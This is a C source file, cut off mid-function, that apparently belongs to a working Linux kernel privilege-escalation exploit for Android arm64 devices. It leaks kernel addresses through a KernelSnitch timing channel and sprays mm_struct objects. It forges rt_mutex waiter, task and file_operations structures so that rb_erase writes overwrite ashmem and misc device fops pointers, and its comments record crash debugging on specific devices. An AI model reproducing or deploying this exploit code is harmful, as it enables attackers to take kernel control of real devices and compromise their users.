#include "common.h"
#include "kernelsnitch/kernelsnitch.h"

static struct kernelsnitch_shared_state *ks;
static size_t mm_objs_per_slab;
static unsigned char *skb_buf;
static int reclaim_sv[2] = {-1, -1};
static struct mm_ctx prepare_ctx;
static struct mm_ctx spray_ctx;
static struct mm_ctx pre_ctx;
static struct mm_ctx post_ctx;
static pid_t child_leak;

static int controlled_uring_prewarm(void);
static void controlled_uring_finish_prewarm(void);
static int controlled_spectrum_reclaim(void);

struct mm_slabinfo {
  unsigned long active_objs;
  unsigned long num_objs;
  unsigned long object_size;
  unsigned long objects_per_slab;
  unsigned long pages_per_slab;
  unsigned long active_slabs;
  unsigned long num_slabs;
};

static int read_mm_slabinfo(struct mm_slabinfo *info) {
  FILE *fp = fopen("/proc/slabinfo", "re");
  if (!fp)
    return 0;

  char line[512];
  int found = 0;
  while (fgets(line, sizeof(line), fp)) {
    if (strncmp(line, "mm_struct ", 10) != 0)
      continue;
    found = sscanf(
        line,
        "mm_struct %lu %lu %lu %lu %lu : tunables %*lu %*lu %*lu : slabdata %lu %lu %*lu",
        &info->active_objs, &info->num_objs, &info->object_size,
        &info->objects_per_slab, &info->pages_per_slab,
        &info->active_slabs, &info->num_slabs) == 7;
    break;
  }
  fclose(fp);
  return found;
}

unsigned long controlled_mm_slab_count(void) {
  struct mm_slabinfo info = {0};
  return read_mm_slabinfo(&info) ? info.num_slabs : 0;
}

#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
    defined(SLIDE_P0_OFFSET_CANDIDATES)
static const uintptr_t slide_bank_offsets[] = {
  SLIDE_P0_OFFSET_CANDIDATES
};
static uintptr_t slide_bank_payload_base;
static uintptr_t slide_bank_parents[SLIDE_BANK_SLOTS];
static uintptr_t slide_bank_targets[SLIDE_BANK_SLOTS];

_Static_assert(
    SLIDE_BANK_TASK_OFF + (SLIDE_BANK_SLOTS - 1) * SLIDE_BANK_TASK_STRIDE +
            FAKE_TASK_PI_BLOCKED_ON_OFF + sizeof(uint64_t) <=
        SLIDE_BANK_LOCK_OFF,
    "slide task bank overlaps lock bank");
_Static_assert(
    SLIDE_BANK_LOCK_OFF + (SLIDE_BANK_SLOTS - 1) * SLIDE_BANK_SLOT_STRIDE +
            SLIDE_BANK_WAITER_OFF + FAKE_WAITER_LAYOUT_SIZE <=
        ORDER3_SIZE,
    "slide lock bank exceeds reclaimed page");
#endif

uintptr_t page_base;
uintptr_t fake_lock;
uintptr_t fake_w0;
uintptr_t fake_task;
uintptr_t fake_parent;
uintptr_t fake_right;
uintptr_t fake_left;
uintptr_t fake_fops;
uintptr_t binwrite_target;
uintptr_t slide_p0_offset;
uintptr_t slide_oracle_parent;
uintptr_t slide_oracle_target;
uintptr_t p0_gate_page_struct;
uintptr_t p0_probe_page_struct;
char ashmem_path[256] = "/dev/ashmem";

static void put_fake_waiter(unsigned char *payload, size_t waiter_off,
                            uintptr_t tree_parent, uintptr_t tree_right,
                            uintptr_t tree_left, uintptr_t pi_parent,
                            uintptr_t pi_right, uintptr_t pi_left,
                            uintptr_t task, uintptr_t lock,
                            uint32_t priority) {
  put64(payload, waiter_off + 0x00, tree_parent);
  put64(payload, waiter_off + 0x08, tree_right);
  put64(payload, waiter_off + 0x10, tree_left);
#if LEGACY_RT_MUTEX_WAITER || COMPACT_RT_MUTEX_WAITER
  put64(payload, waiter_off + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00,
        pi_parent);
  put64(payload, waiter_off + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, pi_right);
  put64(payload, waiter_off + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, pi_left);
  put64(payload, waiter_off + FAKE_WAITER_TASK_OFF, task);
  put64(payload, waiter_off + FAKE_WAITER_LOCK_OFF, lock);
#if COMPACT_RT_MUTEX_WAITER
  put32(payload, waiter_off + FAKE_WAITER_WAKE_STATE_OFF, 0);
#endif
  put32(payload, waiter_off + FAKE_WAITER_PRIO_OFF, priority);
  put64(payload, waiter_off + FAKE_WAITER_DEADLINE_OFF, 0);
#if COMPACT_RT_MUTEX_WAITER
  put64(payload, waiter_off + FAKE_WAITER_WW_CTX_OFF, 0);
#endif
#else
  put32(payload, waiter_off + FAKE_WAITER_TREE_PRIO_OFF, priority);
  put64(payload, waiter_off + FAKE_WAITER_TREE_DEADLINE_OFF, 0);
  put64(payload, waiter_off + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00,
        pi_parent);
  put64(payload, waiter_off + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, pi_right);
  put64(payload, waiter_off + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, pi_left);
  put32(payload, waiter_off + FAKE_WAITER_PI_TREE_PRIO_OFF, priority);
  put64(payload, waiter_off + FAKE_WAITER_PI_TREE_DEADLINE_OFF, 0);
  put64(payload, waiter_off + FAKE_WAITER_TASK_OFF, task);
  put64(payload, waiter_off + FAKE_WAITER_LOCK_OFF, lock);
  put32(payload, waiter_off + FAKE_WAITER_WAKE_STATE_OFF, 0);
  put64(payload, waiter_off + FAKE_WAITER_WW_CTX_OFF, 0);
#endif
}

#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
    defined(SLIDE_P0_OFFSET_CANDIDATES)
int select_slide_payload_slot(uintptr_t offset) {
  if (!slide_bank_payload_base) {
    return 0;
  }
  for (size_t i = 0;
       i < sizeof(slide_bank_offsets) / sizeof(slide_bank_offsets[0]); i++) {
    if (slide_bank_offsets[i] != offset) {
      continue;
    }
#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
    return select_slide_payload_index(1);
#else
    return select_slide_payload_index(i);
#endif
  }
  return 0;
}

int select_slide_payload_index(size_t index) {
  if (!slide_bank_payload_base || index >= SLIDE_BANK_SLOTS) {
    return 0;
  }
  fake_task = slide_bank_payload_base + SLIDE_BANK_TASK_OFF +
              index * SLIDE_BANK_TASK_STRIDE;
  fake_lock = slide_bank_payload_base + SLIDE_BANK_LOCK_OFF +
              index * SLIDE_BANK_SLOT_STRIDE;
  fake_w0 = fake_lock + SLIDE_BANK_WAITER_OFF;
  slide_oracle_parent = slide_bank_parents[index];
  slide_oracle_target = slide_bank_targets[index];
  return 1;
}

static void put_slide_bank_entry(unsigned char *p, uintptr_t payload_base,
                                 size_t slot, uintptr_t parent,
                                 uintptr_t target) {
  size_t task_off = SLIDE_BANK_TASK_OFF + slot * SLIDE_BANK_TASK_STRIDE;
  size_t lock_off = SLIDE_BANK_LOCK_OFF + slot * SLIDE_BANK_SLOT_STRIDE;
  size_t waiter_off = lock_off + SLIDE_BANK_WAITER_OFF;
  uintptr_t task = payload_base + task_off;
  uintptr_t lock = payload_base + lock_off;
  uintptr_t waiter = payload_base + waiter_off;

  put32(p, lock_off + 0x00, 0);
  put64(p, lock_off + 0x08, waiter);
  put64(p, lock_off + 0x10, waiter);
  put64(p, lock_off + 0x18, SLIDE_LOCK_OWNER_VALUE);
  put_fake_waiter(p, waiter_off, 1, 0, 0, parent, 0, target, task, lock,
                  SLIDE_FAKE_WAITER_PRIO);
  put32(p, task_off + FAKE_TASK_USAGE_OFF, 0x100);
  put32(p, task_off + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
  put32(p, task_off + FAKE_TASK_NORMAL_PRIO_OFF, FAKE_TASK_PRIO);
  put64(p, task_off + FAKE_TASK_TASK_GROUP_OFF, 0);
  put32(p, task_off + FAKE_TASK_PI_LOCK_OFF, 0);
  put64(p, task_off + FAKE_TASK_PI_WAITERS_OFF,
        waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF);
  put64(p, task_off + FAKE_TASK_PI_WAITERS_OFF + 0x08,
        waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF);
  put64(p, task_off + FAKE_TASK_PI_TOP_TASK_OFF, task);
  put64(p, task_off + FAKE_TASK_PI_BLOCKED_ON_OFF, 0);
}
#endif

void setup_kernelsnitch(void) {
  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
#if defined(APP_PAYLOAD) && APP_PAYLOAD
  /* verbose=1 on app builds: expose collision finding / bruteforce
   * progress in logcat while diagnosing the o1q KernelSnitch leak. */
  ks = kernelsnitch_setup(
      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 1, 0);
#else
  ks = kernelsnitch_setup(
      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0, 0);
#endif
#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
  kernelsnitch_set_profile(
      ks, SLIDE_KSNITCH_APPENDED_FUTEXES,
      SLIDE_KSNITCH_REPEAT_MEASUREMENT,
      SLIDE_KSNITCH_AVERAGE);
#endif
}

int kernelsnitch_collisions_ready(void) {
  return kernelsnitch_found_collisions(ks);
}

void run_kernelsnitch_bruteforce(void) {
  kernelsnitch_bruteforce(ks);
}

uintptr_t cleanup_kernelsnitch(void) {
  uintptr_t leaked = kernelsnitch_cleanup(ks);
  ks = NULL;
  return leaked;
}

void read_first_line(const char *path, char *buf, size_t len) {
  if (!len) {
    return;
  }
  snprintf(buf, len, "unreadable");
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return;
  }
  ssize_t n = read(fd, buf, len - 1);
  int saved_errno = errno;
  close(fd);
  if (n <= 0) {
    errno = saved_errno;
    snprintf(buf, len, "unreadable");
    return;
  }
  buf[n] = 0;
  buf[strcspn(buf, "\r\n")] = 0;
}

void log_startup_context(void) {
  char attr[256];
  char enforce[32];
  char status[4096];
  char limits[160] = "NoNewPrivs=? Seccomp=? Seccomp_filters=?";
  read_first_line("/proc/self/attr/current", attr, sizeof(attr));
  read_first_line("/sys/fs/selinux/enforce", enforce, sizeof(enforce));
  int fd = open("/proc/self/status", O_RDONLY | O_CLOEXEC);
  if (fd >= 0) {
    ssize_t n = read(fd, status, sizeof(status) - 1);
    close(fd);
    if (n > 0) {
      status[n] = 0;
      const char *names[] = {"NoNewPrivs:", "Seccomp:", "Seccomp_filters:"};
      char values[3][32] = {"?", "?", "?"};
      for (size_t i = 0; i < 3; i++) {
        char *p = strstr(status, names[i]);
        if (p) {
          p += strlen(names[i]);
          while (*p == '\t' || *p == ' ') {
            p++;
          }
          size_t len = strcspn(p, "\r\n");
          if (len >= sizeof(values[i])) {
            len = sizeof(values[i]) - 1;
          }
          memcpy(values[i], p, len);
          values[i][len] = 0;
        }
      }
      snprintf(limits, sizeof(limits), "NoNewPrivs=%s Seccomp=%s "
               "Seccomp_filters=%s", values[0], values[1], values[2]);
    }
  }
  pr_success("startup context pid=%d uid=%u euid=%u gid=%u egid=%u attr=%s enforce=%s\n",
             getpid(), getuid(), geteuid(), getgid(), getegid(), attr,
             enforce);
  pr_success("startup limits pid=%d %s\n", getpid(), limits);
  pr_success("build config pid=%d label=%s slide=pselect main=pselect\n",
             getpid(), BUILD_VARIANT_LABEL);
  pr_success("p0 profile pid=%d phys_offset=%016llx kernel_phys_load=%016llx "
             "delta=%016llx slide_logger=%016llx bootid_data=%016llx "
             "init_task=%016llx root_tg=%016llx sysctl_bootid=%016llx\n",
             getpid(), (unsigned long long)P0_PHYS_OFFSET,
             (unsigned long long)P0_KERNEL_PHYS_LOAD,
             (unsigned long long)P0_KERNEL_PHYS_DELTA,
             (unsigned long long)SLIDE_NFULNL_LOGGER_NAME,
             (unsigned long long)SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR,
             (unsigned long long)SLIDE_INIT_TASK,
             (unsigned long long)SLIDE_ROOT_TASK_GROUP,
             (unsigned long long)SLIDE_SYSCTL_BOOTID);
}

void disable_rseq_for_thread(void) {
  return;
}

long futex_op(uint32_t *uaddr, int op, uint32_t val,
              const struct timespec *timeout, uint32_t *uaddr2,
              uint32_t val3) {
  return syscall(SYS_futex, uaddr, op, val, timeout, uaddr2, val3);
}

long sched_setattr_tid(int tid, int nice_value) {
  struct local_sched_attr attr;
  memset(&attr, 0, sizeof(attr));
  attr.size = sizeof(attr);
  attr.sched_policy = SCHED_BATCH;
  attr.sched_nice = nice_value;
  return syscall(SYS_sched_setattr, tid, &attr, 0);
}

long sched_setattr_tid_nochange(int tid) {
  /* Re-apply the target's CURRENT policy/nice/flags/uclamp: a scheduler
   * no-op that still runs the full __sched_setscheduler path - including
   * the rt_mutex_adjust_pi pi-chain walk at its tail (gated only by the
   * pi argument, not by the attr values).
   *
   * A class or nice CHANGE on a task that is RUNNING on another CPU forces
   * resched_curr -> a resched IPI to that CPU. The target then takes the
   * IPI in userspace, gets need_resched set, and the IRQ return path runs
   * schedule() on its own kernel stack - whose frames overwrite the stale
   * pselect spray the walk is about to read (observed as two identical
   * rtmutex_common.h:60 BUG panics: the walk read W->lock = a frame pointer
   * left by the schedule/IPI frames instead of the sprayed fake_lock). */
  struct local_sched_attr attr;
  memset(&attr, 0, sizeof(attr));
  attr.size = sizeof(attr);
  if (syscall(SYS_sched_getattr, tid, &attr, sizeof(attr), 0) != 0) {
    return -1;
  }
  attr.size = sizeof(attr);
  return syscall(SYS_sched_setattr, tid, &attr, 0);
}

int try_cache_ashmem_path(const char *path) {
  int fd = open(path, O_RDWR | O_CLOEXEC);
  if (fd < 0) {
    return 0;
  }

  close(fd);
  snprintf(ashmem_path, sizeof(ashmem_path), "%s", path);
  return 1;
}

int same_rdev_path(const char *path, dev_t rdev) {
  struct stat st;
  if (stat(path, &st) != 0) {
    return 0;
  }
  return S_ISCHR(st.st_mode) && st.st_rdev == rdev;
}

void init_ashmem_path(void) {
  char boot_id[128];
  int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
  if (fd >= 0) {
    ssize_t n = read(fd, boot_id, sizeof(boot_id) - 1);
    close(fd);
    if (n > 0) {
      boot_id[n] = 0;
      boot_id[strcspn(boot_id, "\r\n")] = 0;

      char path[256];
      snprintf(path, sizeof(path), "/dev/ashmem%s", boot_id);
      if (try_cache_ashmem_path(path)) {
        return;
      }
    }
  }

  struct stat base;
  int have_base = stat("/dev/ashmem", &base) == 0;
  have_base = have_base && S_ISCHR(base.st_mode);
  DIR *dir = opendir("/dev");
  if (dir && have_base) {
    struct dirent *de;
    while ((de = readdir(dir)) != NULL) {
      if (strncmp(de->d_name, "ashmem", 6) != 0 ||
          strcmp(de->d_name, "ashmem") == 0) {
        continue;
      }

      char path[256];
      snprintf(path, sizeof(path), "/dev/%s", de->d_name);
      if (same_rdev_path(path, base.st_rdev) &&
          try_cache_ashmem_path(path)) {
        closedir(dir);
        return;
      }
    }
  }
  if (dir) {
    closedir(dir);
  }
}

int open_ashmem_device(void) {
  return SYSCHK(open(ashmem_path, O_RDWR | O_CLOEXEC));
}

uintptr_t p0_data_alias(uintptr_t image_addr) {
  /* The arm64 linear map is PAGE_OFFSET + FULL physical address. The old
   * form subtracted P0_PHYS_OFFSET before OR-ing with P0_PAGE_OFFSET,
   * which on r9q (P0_PAGE_OFFSET = 0xffffff8000000000, DRAM at 0x80000000)
   * made every alias short exactly 0x80000000: the walk's rb_erase write
   * landed in unrelated physmap RAM 2GB below the target (silently
   * harmless, hence unnoticed), and every physrw address resolved a pfn
   * 0x80000 pages off. */
  uintptr_t off = image_addr - KIMAGE_TEXT_BASE;
  uintptr_t phys = P0_KERNEL_PHYS_LOAD + off;
  return (phys | P0_PAGE_OFFSET);
}

uintptr_t p0_alias_image_offset(uintptr_t data_alias) {
  return (data_alias - P0_PAGE_OFFSET) - P0_KERNEL_PHYS_LOAD;
}

uintptr_t data_addr(uintptr_t image_addr) {
  return p0_data_alias(image_addr) + slide_p0_offset;
}

uintptr_t kaslr_image_addr(uintptr_t image_addr) {
  if (!kaslr_done) {
    return image_addr;
  }
  return kaslr_base + (image_addr - KIMAGE_TEXT_BASE);
}

uintptr_t text_addr(uintptr_t image_addr) {
  return kaslr_image_addr(image_addr);
}

uintptr_t slide_canon_addr(uintptr_t data_alias) {
  return kaslr_base + p0_alias_image_offset(data_alias);
}

uintptr_t canon_addr(uintptr_t image_addr) {
  return text_addr(image_addr);
}

void put64(unsigned char *p, size_t off, uint64_t value) {
  memcpy(p + off, &value, sizeof(value));
}

void put32(unsigned char *p, size_t off, uint32_t value) {
  memcpy(p + off, &value, sizeof(value));
}

void put_fake_fops_table(unsigned char *p, size_t off) {
  put64(p, off + FOPS_OWNER_OFF, 0);
  put64(p, off + FOPS_LLSEEK_OFF,
        fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
  put64(p, off + FOPS_READ_OFF, text_addr(CONFIGFS_READ_FILE_CFI));
  put64(p, off + FOPS_WRITE_OFF, text_addr(CONFIGFS_WRITE_BIN_FILE_CFI));
  put64(p, off + FOPS_READ_ITER_OFF, 0);
  put64(p, off + FOPS_WRITE_ITER_OFF, 0);
  put64(p, off + FOPS_IOCTL_OFF, text_addr(ASHMEM_IOCTL_CFI));
  put64(p, off + FOPS_COMPAT_IOCTL_OFF, text_addr(ASHMEM_COMPAT_IOCTL_CFI));
  put64(p, off + FOPS_MMAP_OFF, text_addr(ASHMEM_MMAP_CFI));
  put64(p, off + FOPS_OPEN_OFF, text_addr(ASHMEM_OPEN_CFI));
  put64(p, off + FOPS_RELEASE_OFF, text_addr(ASHMEM_RELEASE_CFI));
  put64(p, off + FOPS_SPLICE_READ_OFF, text_addr(COPY_SPLICE_READ_CFI));
  put64(p, off + FOPS_SHOW_FDINFO_OFF, text_addr(ASHMEM_SHOW_FDINFO_CFI));
}

int try_put_blob_no_zeros(int fd, const unsigned char *blob, size_t len) {
  char name[ASHMEM_NAME_LEN];
  memset(name, 0x41, sizeof(name));

  for (size_t i = 0; i < len; i++) {
    name[i] = blob[i] ? blob[i] : 1;
  }
  name[len] = 0;
  return ioctl(fd, ASHMEM_SET_NAME, name);
}

int try_put_blob_zero_at(int fd, const unsigned char *blob, size_t pos) {
  char name[ASHMEM_NAME_LEN];
  memset(name, 0x41, sizeof(name));

  for (size_t i = 0; i < pos; i++) {
    name[i] = blob[i] ? blob[i] : 1;
  }
  name[pos] = 0;
  return ioctl(fd, ASHMEM_SET_NAME, name);
}

int try_set_ashmem_name_blob(int fd, const unsigned char *blob, size_t len) {
  if (try_put_blob_no_zeros(fd, blob, len) != 0) {
    return -1;
  }

  for (size_t i = len; i > 0; i--) {
    if (blob[i - 1] == 0 &&
        try_put_blob_zero_at(fd, blob, i - 1) != 0) {
      return -1;
    }
  }
  return 0;
}

pid_t clone_child(void) {
  pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
  if (child == 0) {
    SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
    if (getppid() == 1) {
      _exit(0);
    }
    pin_to_core(CORE);
    for (;;) {
      pause();
    }
  }
  return child;
}

pid_t clone_leak_child(void) {
  pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
  if (child == 0) {
    SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
    if (getppid() == 1) {
      _exit(1);
    }
    kernelsnitch_find_collisions(ks);
    exit(0);
  }
  return child;
}

int open_memfd(pid_t child) {
  char path[64];
  snprintf(path, sizeof(path), "/proc/%d/mem", child);
  return SYSCHK(open(path, O_RDONLY));
}

void kill_child(pid_t child) {
  if (child <= 0) {
    return;
  }
  SYSCHK(kill(child, SIGKILL));
  SYSCHK(waitpid(child, NULL, 0));
}

void close_reclaim_sockets(void) {
  for (int i = 0; i < 2; i++) {
    if (reclaim_sv[i] >= 0) {
      close(reclaim_sv[i]);
      reclaim_sv[i] = -1;
    }
  }
}

int reclaim_receiver_fd(void) {
  return reclaim_sv[1];
}

void close_ctx_memfds(struct mm_ctx *ctx) {
  for (size_t i = 0; i < ctx->mm_cnt; i++) {
    if (ctx->memfds[i] > 0) {
      close(ctx->memfds[i]);
      ctx->memfds[i] = -1;
    }
  }
}

void free_ctx_storage(struct mm_ctx *ctx) {
  free(ctx->childs);
  free(ctx->memfds);
  ctx->childs = NULL;
  ctx->memfds = NULL;
  ctx->mm_cnt = 0;
}

void cleanup_page_prepare_state(void) {
  close_ctx_memfds(&prepare_ctx);
  close_ctx_memfds(&spray_ctx);
  close_ctx_memfds(&pre_ctx);
  close_ctx_memfds(&post_ctx);
  if (memfd_leak > 0) {
    close(memfd_leak);
    memfd_leak = -1;
  }
  free_ctx_storage(&prepare_ctx);
  free_ctx_storage(&spray_ctx);
  free_ctx_storage(&pre_ctx);
  free_ctx_storage(&post_ctx);
  free(skb_buf);
  skb_buf = NULL;
}

int clone_memfd(void) {
  pid_t child = clone_child();
  int fd = open_memfd(child);
  kill_child(child);
  return fd;
}

void prepare_ctxs(void) {
  prepare_ctx.mm_cnt = 32 * mm_objs_per_slab;
  prepare_ctx.childs = calloc(sizeof(pid_t), prepare_ctx.mm_cnt);
  prepare_ctx.memfds = calloc(sizeof(int), prepare_ctx.mm_cnt);

  spray_ctx.mm_cnt = (1 + MM_PARTIALS) * mm_objs_per_slab;
  spray_ctx.childs = calloc(sizeof(pid_t), spray_ctx.mm_cnt);
  spray_ctx.memfds = calloc(sizeof(int), spray_ctx.mm_cnt);

  pre_ctx.mm_cnt = mm_objs_per_slab - 1;
  pre_ctx.childs = calloc(sizeof(pid_t), pre_ctx.mm_cnt);
  pre_ctx.memfds = calloc(sizeof(int), pre_ctx.mm_cnt);

  post_ctx.mm_cnt = mm_objs_per_slab;
  post_ctx.childs = calloc(sizeof(pid_t), post_ctx.mm_cnt);
  post_ctx.memfds = calloc(sizeof(int), post_ctx.mm_cnt);
}

int prepare_skb_payload(uintptr_t base, int payload_mode) {
  memset(skb_buf, 0, SKB_SEND_SIZE);

  uintptr_t payload_base = base + SKB_DATA_DELTA;

#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
    defined(SLIDE_P0_OFFSET_CANDIDATES)
  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
    slide_bank_payload_base = payload_base;
    for (size_t chunk = 0; chunk < SKB_SEND_SIZE; chunk += ORDER3_SIZE) {
      unsigned char *p = skb_buf + chunk + SKB_FRAG_BIAS;
      memcpy(p + P0_ORACLE_GATE_PAGE_OFF, "RMG-P0-ORACLE-GATE", 18);
      for (size_t slot = 0; slot < SLIDE_BANK_SLOTS; slot++) {
        uintptr_t parent;
        uintptr_t target;
#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
        if (slot == P0_ORACLE_GATE_SLOT) {
          parent = direct_to_page(base);
          target = pipebuf_page_base +
                   P0_ORACLE_GATE_OBJECT_INDEX * PIPE_OBJECT_SIZE;
          p0_gate_page_struct = parent;
        } else if (slot == P0_ORACLE_PROBE_SLOT) {
          uintptr_t direct_addr =
              P0_DATA_ALIAS_CONST(KIMAGE_TEXT_BASE) +
              P0_ORACLE_PROBE_OFFSET;
          parent = direct_to_page(direct_addr);
          target = pipebuf_page_base +
                   P0_ORACLE_GATE_OBJECT_INDEX * PIPE_OBJECT_SIZE +
                   sizeof(struct user_pipe_buffer);
          p0_probe_page_struct = parent;
        } else if (slot == P0_ORACLE_GATE_RESTORE_SLOT) {
          parent = p0_gate_page_struct;
          target = 0;
        } else {
          parent = p0_probe_page_struct;
          target = 0;
        }
#else
        uintptr_t offset = slide_bank_offsets[slot];
        parent = SLIDE_NFULNL_LOGGER_OBJECT + offset;
        target = SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR + offset;
#endif
        slide_bank_parents[slot] = parent;
        slide_bank_targets[slot] = target;
        size_t task_off = SLIDE_BANK_TASK_OFF +
                          slot * SLIDE_BANK_TASK_STRIDE;
        size_t lock_off = SLIDE_BANK_LOCK_OFF +
                          slot * SLIDE_BANK_SLOT_STRIDE;
        size_t waiter_off = lock_off + SLIDE_BANK_WAITER_OFF;
        uintptr_t task = payload_base + task_off;
        uintptr_t lock = payload_base + lock_off;
        uintptr_t waiter = payload_base + waiter_off;

        put32(p, lock_off + 0x00, 0);
        put64(p, lock_off + 0x08, waiter);
        put64(p, lock_off + 0x10, waiter);
        put64(p, lock_off + 0x18, SLIDE_LOCK_OWNER_VALUE);

        put_fake_waiter(p, waiter_off, 1, 0, 0, parent, 0, target, task,
                        lock, SLIDE_FAKE_WAITER_PRIO);

        put32(p, task_off + FAKE_TASK_USAGE_OFF, 0x100);
        put32(p, task_off + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
        put32(p, task_off + FAKE_TASK_NORMAL_PRIO_OFF, FAKE_TASK_PRIO);
        put64(p, task_off + FAKE_TASK_TASK_GROUP_OFF, 0);
        put32(p, task_off + FAKE_TASK_PI_LOCK_OFF, 0);
        put64(p, task_off + FAKE_TASK_PI_WAITERS_OFF,
              waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF);
        put64(p, task_off + FAKE_TASK_PI_WAITERS_OFF + 0x08,
              waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF);
        put64(p, task_off + FAKE_TASK_PI_TOP_TASK_OFF, task);
        put64(p, task_off + FAKE_TASK_PI_BLOCKED_ON_OFF, 0);
      }
    }
#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
    return select_slide_payload_index(P0_ORACLE_GATE_SLOT);
#else
    return select_slide_payload_slot(slide_bank_offsets[0]);
#endif
  }
#endif

  fake_lock = payload_base + LOCK_OFF;
  fake_w0 = payload_base + W0_OFF;
  fake_task = payload_base + FAKE_TASK_OFF;
  fake_fops = payload_base + FOPS_TABLE_OFF;
#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
  if (payload_mode == PAGE_PAYLOAD_FOPS) {
    slide_bank_payload_base = payload_base;
    slide_bank_parents[0] = fake_fops;
    slide_bank_targets[0] = data_addr(ASHMEM_MISC_FOPS);
  }
#endif
  if (payload_mode == PAGE_PAYLOAD_MISC_READ) {
    fake_parent = fake_fops;
    /* canon_addr = the slid KERNEL VIRTUAL address. The rb_erase write
     * target must be the slot misc_open actually reads (kernel virtual
     * .data) - not the physmap alias, whose physical-load model is an
     * untested assumption on this device (see p0_data_alias). */
    fake_right = canon_addr(MISC_FOPS) + FOPS_READ_OFF;
    fake_left = 0;
    binwrite_target = payload_base + SCRATCH_OFF;
  } else if (payload_mode == PAGE_PAYLOAD_MISC_WRITE) {
    fake_parent = fake_fops;
    fake_right = canon_addr(MISC_FOPS) + FOPS_WRITE_OFF;
    fake_left = 0;
    binwrite_target = payload_base + SCRATCH_OFF;
  } else if (payload_mode == PAGE_PAYLOAD_FOPS) {
    fake_parent = fake_fops;
    fake_right = canon_addr(ASHMEM_MISC_FOPS);
    /* The erased rb node must have exactly one child: with both children set,
     * rb_erase takes the Case 4 successor path and walks
     * ashmem_misc.list.prev (miscdevice list links) as an rb tree before
     * writing the walked "successor" into ashmem_misc.fops - a wild walk
     * with panic_on_oops=1. fake_left = 0 keeps rb_erase in Case 1, which
     * stores this node's parent_color (fake_fops) at fake_right directly. */
    fake_left = 0;
    binwrite_target = payload_base + SCRATCH_OFF;
  } else {
    fake_parent = data_addr(ASHMEM_MISC_FOPS) - 8;
    fake_right = fake_fops;
    fake_left = payload_base + LEFT_OFF;
    binwrite_target = payload_base + FOPS_OFF + 0x700;
  }

#ifdef SLIDE_RECLAIM_SCAN_PHASE
  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
    for (size_t chunk = 0; chunk < SKB_SEND_SIZE; chunk += ORDER3_SIZE) {
      unsigned char *p = skb_buf + chunk;
      for (size_t off = SLIDE_RECLAIM_SCAN_PHASE;
           off + 0x20 <= ORDER3_SIZE; off += 0x20) {
        put64(p, off + 0x08, 0x4141000000000000ULL | off);
      }
    }
    return 1;
  }
#endif

  /* rb_erase's one-right-child case gives the required two writes:
   *
   *   node->__rb_parent_color = fake_fops   (parent, RED)
   *   node->rb_right          = TARGET
   *   node->rb_left           = NULL
   *
   * __rb_change_child first stores TARGET into fake_fops->rb_right,
   * i.e. the llseek slot at +0x08 (repaired after the first configfs
   * write). Then right->__rb_parent_color = pc stores fake_fops itself
   * at TARGET, which is ashmem_misc.fops. A non-NULL right child makes
   * rebalance NULL regardless of the RED color. The inverse layout used
   * previously also swapped the global pointer, but overwrote
   * fake_fops->owner with TARGET-8|1; misc_open then crashed in
   * try_module_get on that bogus owner. */
  uintptr_t write_target = canon_addr(ASHMEM_MISC_FOPS);
  uintptr_t write_pc = fake_fops;
  uintptr_t write_right = write_target;
  uintptr_t write_left = 0;
  if (payload_mode == PAGE_PAYLOAD_MISC_READ) {
    write_target = canon_addr(MISC_FOPS) + FOPS_READ_OFF;
    write_right = write_target;
  } else if (payload_mode == PAGE_PAYLOAD_MISC_WRITE) {
    write_target = canon_addr(MISC_FOPS) + FOPS_WRITE_OFF;
    write_right = write_target;
  }
  /* waiter_task = fake_task (on the payload page, not init_task): the walk's
   * [10] get_task_struct increments fake_task->usage (2->3), and [13]
   * put_task_struct decrements (3->2), balanced. pi_top_task = fake_task so
   * rt_mutex_setprio takes the early "nothing changed" exit. */
  uint64_t waiter_task = fake_task;
  uint64_t task_group = text_addr(ROOT_TASK_GROUP);
  uint64_t pi_top_task = fake_task;
  uint32_t waiter_prio = FAKE_WAITER_PRIO;
  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
    write_pc = SLIDE_NFULNL_LOGGER_OBJECT + slide_p0_offset;
    write_right = 0;
    write_left = SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR + slide_p0_offset;
#if defined(SLIDE_USE_FAKE_TASK) && SLIDE_USE_FAKE_TASK
    waiter_task = fake_task;
    task_group = 0;
    pi_top_task = fake_task;
#else
    waiter_task = SLIDE_INIT_TASK + slide_p0_offset;
    task_group = SLIDE_ROOT_TASK_GROUP + slide_p0_offset;
